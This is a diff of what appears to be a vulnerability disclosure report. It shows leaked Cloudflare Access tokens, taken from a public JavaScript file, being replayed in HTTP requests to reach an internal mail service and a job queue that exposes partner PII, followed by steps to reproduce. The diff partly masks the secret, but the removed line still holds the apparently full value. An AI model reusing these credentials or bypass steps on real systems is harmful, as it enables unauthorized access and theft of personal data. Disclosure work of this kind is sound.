@@ -43,12 +43,13 @@ I immediately tested the credentials against known internal subdomains. The atta
 
 The first target was the internal mail service, which was protected by Cloudflare Access.
 
-**Simulated Request:**
+**Simulated Request (using leaked tokens):**
 ```http
 GET / HTTP/2
 Host: mail.vulnerable-group.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
 Cf-Access-Client-Id: ec7586fe0fd8d8f06301379d8706dcef.access
-Cf-Access-Client-Secret: d459ead056bedf891cb413f81bb74d40e4c5de1e7fa9ffe3fcb3df431b0f1259
+Cf-Access-Client-Secret: d459ead056bedf891cb413f81bb74d40e*******7fa9ffe3fcb3df431b0f1259
 ```
 
 **Result:** The request was successfully authenticated, granting me unauthorized access to the internal mail service.
@@ -57,12 +58,13 @@ Cf-Access-Client-Secret: d459ead056bedf891cb413f81bb74d40e4c5de1e7fa9ffe3fcb3df4
 
 The most critical finding was an internal job queue monitoring system. Accessing this system revealed highly sensitive data related to partner applications.
 
-**Simulated Request:**
+**Simulated Request (using leaked tokens):**
 ```http
 GET /jobs/completed HTTP/2
 Host: queue-nasa.vulnerable-group.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
 Cf-Access-Client-Id: ec7586fe0fd8d8f06301379d8706dcef.access
-Cf-Access-Client-Secret: d459ead056bedf891cb413f81bb74d40e4c5de1e7fa9ffe3fcb3df431b0f1259
+Cf-Access-Client-Secret: d459ead056bedf891cb413f81bb74d40e*******7fa9ffe3fcb3df431b0f1259
 ```
 
 **Result:** The system returned a list of completed jobs, which included the full request data from partner applications. This exposed a massive amount of PII, including:
@@ -85,7 +87,7 @@ This vulnerability is rated Critical (CVSS 9.1) because it completely bypasses t
 1.  **Locate Credentials**: Navigate to the publicly accessible JavaScript file: `https://cdn-assets-vulnerable-network.com/dev/.../partners-utils.js`.
 2.  **Extract Tokens**: Search for `"ACCESS_SECRET"` and extract the `Cf-Access-Client-Id` and `Cf-Access-Client-Secret` values.
 3.  **Bypass Access**: Use a tool like Burp Repeater to send a request to a protected internal domain (e.g., `mail.vulnerable-group.com`) and include the extracted tokens as `Cf-Access-Client-Id` and `Cf-Access-Client-Secret` headers.
-4.  **Verify PII Leak**: Access the internal job queue endpoint (e.g., `queue-nasa.vulnerable-group.com/jobs/completed`) to confirm the exposure of sensitive PII.
+4.  **Verify PII Leak**: Access the internal job queue endpoint (e.g., `queue-nasa.vulnerable-group.com/jobs/`) to confirm the exposure of sensitive PII.
 
 ## The Fix
 
